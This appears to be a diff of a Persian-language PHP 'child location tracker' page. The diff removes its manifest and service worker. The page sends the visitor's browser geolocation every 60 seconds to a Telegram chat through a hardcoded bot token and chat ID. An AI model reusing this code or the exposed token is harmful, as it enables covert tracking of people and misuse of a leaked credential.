@@ -1,35 +1,5 @@
 <?php
-// این فایل همه‌کاره است: HTML, JS, manifest, SW و دریافت لوکیشن را مدیریت می‌کند
-
-$path = $_SERVER['REQUEST_URI'];
-
-if (strpos($path, 'manifest.webmanifest') !== false) {
-    header('Content-Type: application/manifest+json');
-    echo json_encode([
-        "name" => "ردیاب موقعیت فرزند",
-        "short_name" => "ردیاب",
-        "start_url" => "/tracker.php",
-        "display" => "standalone",
-        "background_color" => "#ffffff",
-        "theme_color" => "#28a745",
-        "icons" => [
-            [
-                "src" => "icon.png",
-                "sizes" => "192x192",
-                "type" => "image/png"
-            ]
-        ]
-    ]);
-    exit;
-}
-
-if (strpos($path, 'service-worker.js') !== false) {
-    header('Content-Type: application/javascript');
-    echo "self.addEventListener('install', event => { console.log('Service Worker نصب شد.'); });";
-    exit;
-}
-
-if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($path, 'send-location') !== false) {
+if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($_SERVER['REQUEST_URI'], 'send-location') !== false) {
     $data = json_decode(file_get_contents("php://input"), true);
     $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";  // توکن شما
     $chat_id = "-1002570608346";  // چت آیدی شما
@@ -57,7 +27,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($path, 'send-location') !== 
   <meta charset="UTF-8">
   <title>ردیاب موقعیت فرزند</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="manifest" href="tracker.php/manifest.webmanifest">
   <style>
     body {
       font-family: Tahoma, sans-serif;
@@ -94,10 +63,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($path, 'send-location') !== 
   </div>
 
   <script>
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('tracker.php/service-worker.js');
-    }
-
     function sendLocation() {
       if (!navigator.geolocation) {
         document.getElementById("status").innerText = "مرورگر از موقعیت مکانی پشتیبانی نمی‌کند.";
@@ -129,8 +94,9 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($path, 'send-location') !== 
       });
     }
 
-    sendLocation();
-    setInterval(sendLocation, 60000); // هر ۶۰ ثانیه
+    // ارسال موقعیت مکانی بدون نیاز به رفرش صفحه
+    sendLocation();  // ارسال موقعیت مکانی در ابتدا
+    setInterval(sendLocation, 60000);  // ارسال هر ۶۰ ثانیه
   </script>
 </body>
 </html>
